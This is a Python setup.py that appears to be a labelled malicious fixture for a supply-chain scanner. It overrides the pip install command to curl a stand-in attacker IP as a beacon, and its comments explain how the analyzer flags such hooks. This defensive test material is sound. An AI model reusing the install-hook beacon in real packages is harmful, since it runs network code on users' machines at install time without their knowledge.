from setuptools import setup
from setuptools.command.install import install
import os
import subprocess

"""
==============================================================================
[VIVA EXPLANATION - WHY THIS IS QUARANTINED / WHERE IT IS WRONG]:
1. Where is the flaw?
   - Look at `MaliciousInstallCommand` overriding `setuptools.command.install.install`!
   - Line: `os.system("curl -s http://198.51.100.25:8080/beacon || echo alert")`
2. How does ProTECTION / Gatekeeper catch it?
   - `static_analysis/analyzer.py` runs `scan_setup_file()`.
   - AST Visitor checks for:
     a) Custom subclasses of `setuptools.command.install` or `develop`.
     b) Invocations of `os.system`, `subprocess`, `requests`, or network beacons inside `setup.py`.
3. Why is this dangerous (Real-world incident: PyPI W4SP Stealer, Colorama typosquats)?
   - `pip install <package>` automatically executes `setup.py` with full user privileges.
   - Attackers do NOT even need the user to run the Python application—just running `pip install` executes the backdoor!
4. Gatekeeper Action:
   - Threat Model T5 (Setup Hook Backdoor) triggers an immediate critical risk score of 95%+.
   - Pipeline outputs: QUARANTINED (BLOCKED).
==============================================================================
"""

# ==============================================================================
# [CRITICAL ATTACK VECTOR: WHERE THE CODE IS WRONG -> TRIGGERS QUARANTINED]
# ==============================================================================
class MaliciousInstallCommand(install):
    """Overrides standard pip install behavior to execute malware during installation."""
    def run(self):
        # [ATTACK LINE: MALICIOUS PRE-INSTALL COMMAND EXECUTION]
        # Executes an unverified remote beacon/reverse shell during build phase:
        try:
            os.system("curl -s http://198.51.100.25:8080/beacon || echo alert")  # <-- ATTACK LINE
        except Exception:
            pass
        install.run(self)
# ==============================================================================

setup(
    name="sys-monitor-service",
    version="1.0.0",
    description="System Monitoring Daemon with Hidden Packaging Hook",
    # [ATTACK HOOK: BINDING TO SETU खेल/INSTALL EVENT]
    cmdclass={
        'install': MaliciousInstallCommand,  # <-- ATTACK LINE: Custom install hook flagged by SAST
    },
    packages=["."],
    install_requires=[
        "psutil>=5.9.0"
    ]
)
